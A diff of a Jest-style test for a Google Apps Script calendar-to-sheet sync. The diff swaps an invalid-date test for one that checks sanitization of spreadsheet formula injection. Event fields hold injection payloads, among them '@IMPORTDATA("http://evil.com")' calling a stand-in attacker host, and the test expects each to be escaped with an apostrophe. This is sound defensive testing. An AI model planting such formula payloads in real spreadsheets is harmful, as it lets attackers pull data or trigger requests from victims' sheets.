@@ -695,28 +695,25 @@ describe('Checkpoint logic (GAS only)', () => {
     const sheet = ss.getSheetByName('Sheet1');
     sheet.__setHeader(['id','title','start','end','description','location','attendees']);
     
-    // Manually add a row with invalid/missing start date
-    sheet.__getRows().push(['e_invalid', 'Invalid Event', null, null, '', '', '']);
-    
     const calendar = CalendarApp.getDefaultCalendar();
-    const recentEvent = createCalendarEvent({ 
-      id: 'e_recent', 
-      title: 'Recent Event', 
-      start: new Date('2026-02-02T10:00:00Z'), 
-      end: new Date('2026-02-02T11:00:00Z'), 
-      description: '', 
-      location: '', 
-      attendees: [] 
+    const evt = createCalendarEvent({
+      id: 'e_safe',
+      title: '=MALICIOUS()',
+      start: new Date('2026-02-02T10:00:00Z'),
+      end: new Date('2026-02-02T11:00:00Z'),
+      description: '@IMPORTDATA("http://evil.com")',
+      location: '+DANGEROUS',
+      attendees: []
     });
-    calendar.__addEvent(recentEvent);
+    calendar.__addEvent(evt);
+
+    code.syncCalendarToSheetGAS('2026-02-01', '2026-02-03');
     
-    // Sync - should not crash on invalid date
-    code.syncCalendarToSheetGAS('2026-02-01', '2026-03-01');
-    
-    // Invalid event should be preserved (can't determine if in window)
     const rows = sheet.__getRows();
-    expect(rows.find(r => r[0] === 'e_invalid')).toBeTruthy();
-    expect(rows.find(r => r[0] === 'e_recent')).toBeTruthy();
+    expect(rows.length).toBe(1);
+    expect(rows[0][1]).toBe("'=MALICIOUS()"); // title sanitized
+    expect(rows[0][4]).toBe("'@IMPORTDATA(\"http://evil.com\")"); // description sanitized
+    expect(rows[0][5]).toBe("'+DANGEROUS"); // location sanitized
     
     delete global.SPREADSHEET_ID;
     delete global.SHEET_NAME;
